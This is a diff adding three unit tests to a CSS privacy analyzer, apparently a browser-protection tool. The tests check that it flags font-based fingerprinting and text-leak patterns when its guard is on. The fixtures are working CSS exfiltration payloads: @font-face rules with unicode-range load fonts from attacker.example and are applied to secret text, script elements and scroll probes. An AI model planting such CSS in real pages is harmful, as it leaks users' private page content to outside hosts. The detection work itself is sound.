@@ -280,4 +280,50 @@ describe("core analyzer", () => {
     expect(summary.findings.some((finding) => finding.reasons.includes("privacy.css_fingerprinting.print_signal"))).toBe(true);
   });
 
+  it("reports rendered-text pseudo-element fingerprinting indicators only when the guard is enabled", () => {
+    const cssText = '@font-face{font-family:"RenderedLeak";src:url("https://attacker.example/rendered.woff2");unicode-range:U+0041}.secret::first-line{font-family:"RenderedLeak";text-transform:uppercase}';
+    const defaultSummary = analyze(cssText);
+    expect(defaultSummary.findings.some((finding) => finding.reasons.includes("privacy.css_fingerprinting.rendered_text_signal"))).toBe(false);
+
+    const guardedSummary = analyzeStylesheet({
+      cssText,
+      pageUrl,
+      sourceKind: "style_element",
+      sourceUrl: pageUrl,
+      enableCssFingerprintingGuard: true,
+    });
+    expect(guardedSummary.findings.some((finding) => finding.reasons.includes("privacy.css_fingerprinting.rendered_text_signal"))).toBe(true);
+    expect(guardedSummary.findings.some((finding) => finding.reasons.includes("privacy.css_fingerprinting.pseudo_element_signal"))).toBe(true);
+    expect(guardedSummary.findings.some((finding) => finding.reasons.includes("privacy.css_fingerprinting.browser_specific_text_signal"))).toBe(true);
+  });
+
+  it("reports overflow and scroll-state CSS fingerprinting indicators only when the guard is enabled", () => {
+    const cssText = '@font-face{font-family:"ScrollLeak";src:url("https://attacker.example/scroll.woff2");unicode-range:U+0041}.scroll-probe{content-visibility:auto;overflow:auto;width:7ch;word-break:break-all;font-family:"ScrollLeak"}';
+    const defaultSummary = analyze(cssText);
+    expect(defaultSummary.findings.some((finding) => finding.reasons.includes("privacy.css_fingerprinting.scroll_signal"))).toBe(false);
+
+    const guardedSummary = analyzeStylesheet({
+      cssText,
+      pageUrl,
+      sourceKind: "style_element",
+      sourceUrl: pageUrl,
+      enableCssFingerprintingGuard: true,
+    });
+    expect(guardedSummary.findings.some((finding) => finding.reasons.includes("privacy.css_fingerprinting.layout_overflow_signal"))).toBe(true);
+    expect(guardedSummary.findings.some((finding) => finding.reasons.includes("privacy.css_fingerprinting.scroll_signal"))).toBe(true);
+  });
+
+  it("reports script text-node and reversed-text indicators as bounded CSS fingerprinting signals", () => {
+    const cssText = '@font-face{font-family:"TextNodeLeak";src:url("https://attacker.example/text.woff2");unicode-range:U+0074}script{display:block;font-family:"TextNodeLeak"}.reversed-secret{direction:rtl;unicode-bidi:bidi-override;overflow:hidden;font-family:"TextNodeLeak"}';
+    const summary = analyzeStylesheet({
+      cssText,
+      pageUrl,
+      sourceKind: "style_element",
+      sourceUrl: pageUrl,
+      enableCssFingerprintingGuard: true,
+    });
+    expect(summary.findings.some((finding) => finding.reasons.includes("privacy.css_fingerprinting.text_node_signal"))).toBe(true);
+    expect(summary.findings.some((finding) => finding.reasons.includes("privacy.css_fingerprinting.browser_specific_text_signal"))).toBe(true);
+  });
+
 });
